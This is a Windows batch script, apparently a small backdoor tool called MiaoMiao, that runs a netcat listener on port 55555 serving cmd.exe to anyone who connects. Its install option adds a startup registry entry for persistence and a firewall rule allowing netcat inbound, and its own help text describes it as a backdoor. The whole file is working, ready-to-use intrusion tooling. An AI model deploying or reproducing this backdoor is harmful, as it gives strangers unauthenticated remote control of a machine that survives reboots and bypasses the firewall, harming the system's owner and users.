::Main interface to control the program: main + install + unistall

@echo off
set BAT_HOME=%~dp0
cd %BAT_HOME%
title MiaoMiao

if "%1" == "/i"      goto install
if "%1" == "-i"      goto install
if "%1" == "/u"      goto unistall
if "%1" == "-u"      goto unistall
if "%1" == "/?"      goto help
if "%1" == "-?"      goto help
if "%1" == "-help"   goto help
if "%1" == "--help"  goto help

::---------------------------------------
:startServer

::start /B "IPSchedule.bat"
start /B nc -l -p 55555 -e cmd.exe -L -d
goto end
::---------------------------------------
:install

taskkill.exe /f /im nc.exe
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v miaomiao /f
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v miaomiao /d "\"%BAT_HOME%MiaoMiao.bat\""
netsh advfirewall firewall add rule name="NetCat" dir=in action=allow program="%BAT_HOME%nc.exe" enable=yes profile=any
::netsh firewall add allowedprogram program = "%BAT_HOME%nc.exe" name = NetCat mode =ENABLE :: Windows XP
goto startServer
::---------------------------------------
:unistall

taskkill.exe /f /im nc.exe
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v miaomiao /f
netsh advfirewall firewall delete rule name="NetCat"
::netsh firewall delete allowedprogram NetCat
del /s /f /q "%BAT_HOME%*.*"
rd /s /q "%BAT_HOME%..\miaomiao"
goto end
::---------------------------------------
:help

echo MiaoMiao is .bat script that uses NetCat to create a backdoor
echo.
echo MiaoMiao.bat [-i] [-u] [-?]
echo.
echo           Without parameters starts the service.
echo.
echo     -i    Install the script (Require administrator rights):
echo           - Kill all the previous instances of the serivce;
echo           - Add the register entry to run the script at startup;
echo           - Add windows firewall exception;
echo           - Start the service.
echo.
echo     -u    Unistall the script (Require administrator rights):
echo           - Kill the service;
echo           - Remove the register entry to run the script at startup;
echo           - Remove windows firewall exception.
echo           - Delete all the file and folder of the program.
echo.
echo     -?    Show this documantation.
echo.
goto end
::---------------------------------------

:end
::exit